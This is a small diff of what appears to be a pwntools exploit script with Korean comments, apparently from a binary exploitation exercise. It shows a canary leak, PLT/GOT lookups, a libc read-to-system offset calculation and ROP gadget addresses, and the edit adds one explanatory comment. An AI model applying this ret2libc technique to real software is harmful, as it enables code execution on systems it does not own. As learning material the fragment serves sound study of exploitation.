@@ -142,7 +142,7 @@ canary = b'\x00' + p.recvn(7)
 read_plt = e.plt['read']       # read_plt = e.symbols['read']와 같음
 read_got = e.got['read']       # 여기서는 got 주소만 알 수 있고 got 주소 안의 내용은 알 수 없음
 write_plt = e.plt['write']
-read_system_offset = libc.symbols['read'] - libc.symbols['system']
+read_system_offset = libc.symbols['read'] - libc.symbols['system'] # symbols는 offset과 같음
 
 pop_rdi = 0x0000000000400853
 pop_rsi_r15 = 0x0000000000400851
